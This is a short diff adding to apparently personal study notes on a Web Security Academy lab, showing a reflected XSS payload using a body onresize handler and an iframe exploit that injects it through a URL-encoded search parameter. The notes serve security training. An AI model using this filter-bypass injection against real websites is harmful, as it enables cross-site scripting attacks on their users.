@@ -64,6 +64,22 @@ Status 200 --> <body>
 
 Copy events to clipboard
 
+![[Pasted image 20240806120258.png]]
+
+```js
+<body onresize="print()">
+```
+
+```js
+<iframe src="https://0aff0012036c406f80a92664002500fa.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+```
+
+
+
+
+
+
+
 
 
 
